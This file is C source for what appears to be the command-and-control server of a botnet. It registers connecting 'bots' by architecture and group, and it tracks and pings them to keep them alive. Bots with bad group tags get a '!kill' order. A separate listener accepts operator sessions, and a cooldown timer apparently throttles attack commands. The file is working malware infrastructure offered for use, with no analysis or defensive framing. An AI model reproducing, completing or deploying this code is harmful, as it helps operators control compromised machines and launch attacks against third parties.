#include "headers/botnet.h"
#include "headers/user_handler.h"
#include "headers/logger.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdbool.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <sys/time.h>
#include <time.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <poll.h>
#include <netdb.h>

Bot bots[MAX_BOTS];
int bot_count = 0;
int global_cooldown = 0;
pthread_mutex_t bot_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t cooldown_mutex = PTHREAD_MUTEX_INITIALIZER;

void cleanup_socket(int* socket) {
    if (socket && *socket > 0) {
        int fd = *socket;
        *socket = -1;
        
        shutdown(fd, SHUT_RDWR);
        
        if (close(fd) == -1) {
            if (errno != EBADF && errno != EINTR) {
                perror("close");
            }
        }
    }
}

void* handle_bot(void* arg) {
    int bot_socket = *((int*)arg);
    free(arg);
    
    int bot_index = -1;
    pthread_mutex_lock(&bot_mutex);
    for(int i = 0; i < bot_count; i++) {
        if(bots[i].socket == bot_socket) {
            bot_index = i;
            break;
        }
    }
    pthread_mutex_unlock(&bot_mutex);
    
    if(bot_index == -1) {
        close(bot_socket);
        return NULL;
    }

    int optval = 1;
    setsockopt(bot_socket, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval));

    char buffer[MAX_COMMAND_LENGTH] = {0};
    ssize_t len;
    
    while (1) {
        len = recv(bot_socket, buffer, sizeof(buffer) - 1, MSG_DONTWAIT);
        if (len > 0) {
            buffer[len] = 0;
            if (strncmp(buffer, "ping", 4) == 0) {
                char pong[64];
                snprintf(pong, sizeof(pong), "pong %s", bots[bot_index].arch);
                send(bot_socket, pong, strlen(pong), MSG_NOSIGNAL);
                memset(buffer, 0, sizeof(buffer));
                continue;
            }
            int valid = 1;
            for (ssize_t i = 0; i < len; i++) {
                if ((unsigned char)buffer[i] < 0x09 || 
                    ((unsigned char)buffer[i] > 0x0D && (unsigned char)buffer[i] < 0x20) || 
                    (unsigned char)buffer[i] > 0x7E) {
                    valid = 0;
                    break;
                }
            }
            if (!valid) break;
            memset(buffer, 0, sizeof(buffer));
        } else if (len == 0 || (errno != EAGAIN && errno != EWOULDBLOCK)) {
            break;
        }
        
        usleep(10000);
    }

    pthread_mutex_lock(&bot_mutex);
    if (bot_index < bot_count && bots[bot_index].socket == bot_socket) {
        bots[bot_index].is_valid = 0;
        char ipbuf[32] = {0};
        inet_ntop(AF_INET, &bots[bot_index].address.sin_addr, ipbuf, sizeof(ipbuf));
        const char* cause = (len == 0) ? "EOF" : strerror(errno);
        log_bot_disconnected(ipbuf, bots[bot_index].arch, cause);
    }
    pthread_mutex_unlock(&bot_mutex);
    
    close(bot_socket);
    return NULL;
}

void* bot_listener(void* arg) {
    int botport = *((int*)arg);
    int bot_server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (bot_server_socket < 0) {
        perror("Failed to create bot server socket");
        return NULL;
    }

    int optval = 1;
    if (setsockopt(bot_server_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0 ||
        setsockopt(bot_server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0 ||
        setsockopt(bot_server_socket, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval)) < 0) {
        perror("Failed to set socket options");
        close(bot_server_socket);
        return NULL;
    }

    struct sockaddr_in bot_server_addr;
    memset(&bot_server_addr, 0, sizeof(bot_server_addr));
    bot_server_addr.sin_family = AF_INET;
    bot_server_addr.sin_addr.s_addr = INADDR_ANY;
    bot_server_addr.sin_port = htons(botport);

    int bind_attempts = 3;
    while (bind_attempts--) {
        if (bind(bot_server_socket, (struct sockaddr*)&bot_server_addr, sizeof(bot_server_addr)) == 0) {
            break;
        }
        if (bind_attempts > 0) {
            perror("Bind failed, retrying");
            sleep(1);
            continue;
        }
        perror("Failed to bind bot server socket");
        close(bot_server_socket);
        return NULL;
    }

    int flags = fcntl(bot_server_socket, F_GETFL, 0);
    fcntl(bot_server_socket, F_SETFL, flags | O_NONBLOCK);

    if (listen(bot_server_socket, MAX_BOTS) < 0) {
        perror("Failed to listen on bot server socket");
        close(bot_server_socket);
        return NULL;
    }

    int epoll_fd = epoll_create1(0);
    if (epoll_fd == -1) {
        perror("epoll_create1 failed");
        close(bot_server_socket);
        return NULL;
    }

    struct epoll_event ev, events[MAX_BOTS+1];
    ev.events = EPOLLIN;
    ev.data.fd = bot_server_socket;
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, bot_server_socket, &ev) == -1) {
        perror("epoll_ctl listen socket");
        close(epoll_fd);
        close(bot_server_socket);
        return NULL;
    }

    while (1) {
        int nfds = epoll_wait(epoll_fd, events, MAX_BOTS+1, -1);
        if (nfds < 0) {
            if (errno == EINTR) continue;
            break;
        }

        for (int n = 0; n < nfds; n++) {
            if (events[n].data.fd == bot_server_socket) {
                struct sockaddr_in client_addr;
                socklen_t client_len = sizeof(client_addr);
                int bot_socket = accept(bot_server_socket, (struct sockaddr*)&client_addr, &client_len);
                if (bot_socket < 0) continue;

                fcntl(bot_socket, F_SETFL, fcntl(bot_socket, F_GETFL, 0) | O_NONBLOCK);
                setsockopt(bot_socket, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval));
                setsockopt(bot_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));

                pthread_mutex_lock(&bot_mutex);
                int duplicate_found = 0;
                for (int i = 0; i < bot_count; i++) {
                    if (bots[i].address.sin_addr.s_addr == client_addr.sin_addr.s_addr) {
                        duplicate_found = 1;
                        break;
                    }
                }
                pthread_mutex_unlock(&bot_mutex);
                
                if (duplicate_found) {
                    close(bot_socket);
                    continue;
                }

                char archbuf[64] = {0};
                ssize_t archlen = recv(bot_socket, archbuf, sizeof(archbuf)-1, MSG_DONTWAIT);
                if (archlen > 0) {
                    archbuf[archlen] = 0;
                    char arch[32] = "unknown", group[64] = "default";
                    char *space = strchr(archbuf, ' ');
                    int bad_group = 0;
                    if (space) {
                        size_t archlen = space - archbuf;
                        if (archlen > 0 && archlen < sizeof(arch)) {
                            strncpy(arch, archbuf, archlen);
                            arch[archlen] = 0;
                            while (*(++space) == ' ');
                            strncpy(group, space, sizeof(group) - 1);
                            group[sizeof(group) - 1] = 0;
                            if (strlen(group) > 16) bad_group = 1;
                            for (size_t gi = 0; group[gi] && !bad_group; gi++) {
                                if (!((group[gi] >= '0' && group[gi] <= '9') || (group[gi] >= 'A' && group[gi] <= 'Z') || (group[gi] >= 'a' && group[gi] <= 'z'))) {
                                    bad_group = 1;
                                }
                            }
                        }
                    } else {
                        strncpy(arch, archbuf, sizeof(arch) - 1);
                        arch[sizeof(arch) - 1] = 0;
                    }
                    if (bad_group) {
                        send(bot_socket, "!kill", 5, MSG_NOSIGNAL);
                        close(bot_socket);
                        continue;
                    }
                    
                    pthread_mutex_lock(&bot_mutex);

                    if (bot_count < MAX_BOTS) {
                        char ipbuf[32];
                        inet_ntop(AF_INET, &client_addr.sin_addr, ipbuf, sizeof(ipbuf));

                        bots[bot_count].socket = bot_socket;
                        bots[bot_count].address = client_addr;
                        bots[bot_count].is_valid = 1;
                        strncpy(bots[bot_count].arch, arch, sizeof(bots[bot_count].arch)-1);
                        bots[bot_count].arch[sizeof(bots[bot_count].arch)-1] = 0;
                        strncpy(bots[bot_count].group, group, sizeof(bots[bot_count].group)-1);
                        bots[bot_count].group[sizeof(bots[bot_count].group)-1] = 0;
                        
                        log_bot_join(bots[bot_count].arch, ipbuf, bots[bot_count].group);
                        ev.events = EPOLLIN | EPOLLRDHUP;
                        ev.data.fd = bot_socket;
                        epoll_ctl(epoll_fd, EPOLL_CTL_ADD, bot_socket, &ev);
                        bot_count++;
                        pthread_mutex_unlock(&bot_mutex);
                        continue;
                    }
                    pthread_mutex_unlock(&bot_mutex);
                }
                close(bot_socket);
            } else {
                int bot_fd = events[n].data.fd;
                char buffer[MAX_COMMAND_LENGTH] = {0};
                ssize_t len = recv(bot_fd, buffer, sizeof(buffer)-1, 0);
                if (len <= 0) {
                    pthread_mutex_lock(&bot_mutex);
                    for (int i = 0; i < bot_count; i++) {
                        if (bots[i].socket == bot_fd) {
                            bots[i].is_valid = 0;
                            char ipbuf[32] = {0};
                            inet_ntop(AF_INET, &bots[i].address.sin_addr, ipbuf, sizeof(ipbuf));
                            const char* cause = (len == 0) ? "EOF" : strerror(errno);
                            log_bot_disconnected(ipbuf, bots[i].arch, cause);
                            break;
                        }
                    }
                    pthread_mutex_unlock(&bot_mutex);
                    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, bot_fd, NULL);
                    close(bot_fd);
                    continue;
                }
                buffer[len] = 0;
                if (strncmp(buffer, "ping", 4) == 0) {
                    pthread_mutex_lock(&bot_mutex);
                    char pong[64];
                    int found = 0;
                    for (int i = 0; i < bot_count; i++) {
                        if (bots[i].socket == bot_fd) {
                            snprintf(pong, sizeof(pong), "pong %s", bots[i].arch);
                            found = 1;
                            break;
                        }
                    }
                    if (found) send(bot_fd, pong, strlen(pong), MSG_NOSIGNAL);
                    pthread_mutex_unlock(&bot_mutex);
                    continue;
                }
                int valid = 1;
                for (ssize_t i = 0; i < len; i++) {
                    if ((unsigned char)buffer[i] < 0x09 || 
                        ((unsigned char)buffer[i] > 0x0D && (unsigned char)buffer[i] < 0x20) || 
                        (unsigned char)buffer[i] > 0x7E) {
                        valid = 0;
                        break;
                    }
                }
                if (!valid) {
                    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, bot_fd, NULL);
                    close(bot_fd);
                }
            }
        }

        pthread_mutex_lock(&bot_mutex);
        int i = 0;
        while (i < bot_count) {
            if (!bots[i].is_valid || bots[i].socket == -1) {
                cleanup_socket(&bots[i].socket);
                for (int j = i + 1; j < bot_count; j++) {
                    bots[j - 1] = bots[j];
                }
                bot_count--;
                continue; 
            }
            i++;
        }
        pthread_mutex_unlock(&bot_mutex);
    }

    close(epoll_fd);
    close(bot_server_socket);
    return NULL;
}

void scan_and_kill_bad_groups(void) {
    pthread_mutex_lock(&bot_mutex);
    int i = 0;
    while (i < bot_count) {
        if (!bots[i].is_valid) { i++; continue; }
        int bad_group = 0;
        if (strlen(bots[i].group) > 16) bad_group = 1;
        for (size_t gi = 0; bots[i].group[gi] && !bad_group; gi++) {
            char c = bots[i].group[gi];
            if (!((c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'))) {
                bad_group = 1;
            }
        }
        if (bad_group) {
            send(bots[i].socket, "!kill", 5, MSG_NOSIGNAL);
            cleanup_socket(&bots[i].socket);
            bots[i].is_valid = 0;
            for (int j = i + 1; j < bot_count; j++) bots[j-1] = bots[j];
            bot_count--;
            continue; 
        }
        i++;
    }
    pthread_mutex_unlock(&bot_mutex);
}


void* ping_bots(void* arg) {
    int epoll_fd = epoll_create1(0);
    if (epoll_fd == -1) {
        return NULL;
    }

    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (bots[i].is_valid) {
            struct epoll_event ev;
            ev.events = EPOLLIN | EPOLLOUT | EPOLLET;
            ev.data.fd = bots[i].socket;
            epoll_ctl(epoll_fd, EPOLL_CTL_ADD, bots[i].socket, &ev);
        }
    }
    pthread_mutex_unlock(&bot_mutex);

    struct epoll_event events[MAX_BOTS];
    char pongbuf[64];
    int dead_bot_cleanup_counter = 0;
    
    while (1) {
        sleep(2);
        dead_bot_cleanup_counter++;
        if (dead_bot_cleanup_counter >= 30) {
            pthread_mutex_lock(&bot_mutex);
            int new_count = 0;
            for (int i = 0; i < bot_count; i++) {
                if (bots[i].is_valid) {
                    char test = 0;
                    if (send(bots[i].socket, &test, 0, MSG_NOSIGNAL) < 0) {
                        char ipbuf[32] = {0};
                        inet_ntop(AF_INET, &bots[i].address.sin_addr, ipbuf, sizeof(ipbuf));
                        char errbuf[128];
                        snprintf(errbuf, sizeof(errbuf), "socket error: %s", strerror(errno));
                        log_bot_disconnected(ipbuf, bots[i].arch, errbuf);
                        cleanup_socket(&bots[i].socket);
                        bots[i].is_valid = 0;
                        continue;
                    }
                    if (i != new_count) {
                        bots[new_count] = bots[i];
                    }
                    new_count++;
                }
            }
            bot_count = new_count;
            pthread_mutex_unlock(&bot_mutex);
            dead_bot_cleanup_counter = 0;
        }
        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++) {
            if (bots[i].is_valid) {
                send(bots[i].socket, "ping", 4, MSG_NOSIGNAL | MSG_DONTWAIT);
            }
        }
        pthread_mutex_unlock(&bot_mutex);
        int nfds = epoll_wait(epoll_fd, events, MAX_BOTS, 1000);
        for (int n = 0; n < nfds; n++) {
            int fd = events[n].data.fd;
            memset(pongbuf, 0, sizeof(pongbuf));
            ssize_t ponglen = recv(fd, pongbuf, sizeof(pongbuf)-1, MSG_DONTWAIT);
            if (ponglen <= 0 || (ponglen > 1 && strncmp(pongbuf, "pong ", 5) != 0)) {
                pthread_mutex_lock(&bot_mutex);
                for (int i = 0; i < bot_count; i++) {
                    if (bots[i].socket == fd) {
                        bots[i].is_valid = 0;
                        cleanup_socket(&bots[i].socket);
                        break;
                    }
                }
                pthread_mutex_unlock(&bot_mutex);
                epoll_ctl(epoll_fd, EPOLL_CTL_DEL, fd, NULL);
            }
        }
        pthread_mutex_lock(&bot_mutex);
        int i = 0;
        while (i < bot_count) {
            if (!bots[i].is_valid || bots[i].socket == -1) {
                cleanup_socket(&bots[i].socket);
                for (int j = i + 1; j < bot_count; j++) {
                    bots[j - 1] = bots[j];
                }
                bot_count--;
                continue;
            }
            i++;
        }
        pthread_mutex_unlock(&bot_mutex);
    }

    close(epoll_fd);
    return NULL;
}

void* manage_cooldown(void* arg) {
    while (1) {
        pthread_mutex_lock(&cooldown_mutex);
        if (global_cooldown > 0) {
            global_cooldown--;
        }
        pthread_mutex_unlock(&cooldown_mutex);
        sleep(1);
    }
    return NULL;
}

void* cnc_listener(void* arg) {
    int cncport = *((int*)arg);
    int server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) {
        perror("Failed to create CNC server socket");
        return NULL;
    }

    int optval = 1;
    if (setsockopt(server_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0 ||
        setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        perror("Failed to set CNC socket options");
        close(server_socket);
        return NULL;
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(cncport);

    int bind_attempts = 3;
    while (bind_attempts--) {
        if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
            break;
        }
        if (bind_attempts > 0) {
            perror("CNC bind failed, retrying");
            sleep(1);
            continue;
        }
        perror("Failed to bind CNC server socket");
        close(server_socket);
        return NULL;
    }

    if (listen(server_socket, 16) < 0) {
        perror("Failed to listen on CNC server socket");
        close(server_socket);
        return NULL;
    }

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int *client_socket = malloc(sizeof(int));
        if (!client_socket) continue;
        *client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
        if (*client_socket < 0) {
            free(client_socket);
            continue;
        }
        pthread_t client_thread;
        pthread_create(&client_thread, NULL, handle_client, client_socket);
        pthread_detach(client_thread);
    }
    close(server_socket);
    return NULL;
}